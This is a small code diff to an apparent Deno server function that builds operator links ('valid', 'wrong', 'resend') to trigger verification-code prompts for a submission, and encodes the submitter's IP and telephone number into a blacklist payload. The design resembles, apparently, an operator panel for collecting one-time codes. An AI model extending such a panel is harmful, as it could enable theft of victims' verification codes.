@@ -37,7 +37,7 @@ Deno.serve(async (req) => {
   // These links call triggerSendCode with the action param
   const validUrl   = `${appUrl}/?triggerAction=valid&id=${submissionId}`;
   const wrongUrl   = `${appUrl}/?triggerAction=wrong&id=${submissionId}`;
-  const expiredUrl = `${appUrl}/?triggerAction=expired&id=${submissionId}`;
+  const expiredUrl = `${appUrl}/?triggerAction=resend&id=${submissionId}`;
 
   // Create a simple blacklist URL with base64 encoding
   const blacklistPayload = btoa(JSON.stringify({ ip, telephone, submissionId }));
